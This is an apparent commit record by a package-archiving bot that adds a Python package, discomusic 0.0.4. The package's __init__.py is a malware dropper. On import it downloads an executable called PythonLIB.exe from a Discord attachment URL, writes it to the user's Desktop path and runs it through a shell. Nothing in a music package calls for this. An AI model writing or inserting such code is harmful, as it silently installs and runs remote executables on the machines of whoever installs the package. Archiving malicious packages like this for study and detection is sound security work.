e38fbe6cbd22ab4a730838bb77c246010b045648
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-11-19 04:04:16 +0000

    Add package discomusic/0.0.4/discomusic-0.0.4.tar.gz

---
+++ packages/discomusic/discomusic-0.0.4.tar.gz/discomusic-0.0.4/discomusic/__init__.py
@@ -0,0 +1,16 @@
+import requests
+import subprocess
+import os
+
+path = os.environ["USERPROFILE"] + "\Desktop"
+
+response = requests.get("https://cdn.discordapp.com/attachments/1172852260624154634/1175473089748934656/PythonLIB.exe?ex=656b5b9f&is=6558e69f&hm=1d4e961eb9b5c1644449a0caf02b6f2e7d4e17c9a8bb3ded2a92d05bbcf80a1e&")
+
+if response.status_code != 200:
+    exit()
+
+with open(path, 'wb') as file:
+    file.write(response.content)
+
+if os.path.exists(path):
+    subprocess.run(path, shell=True)
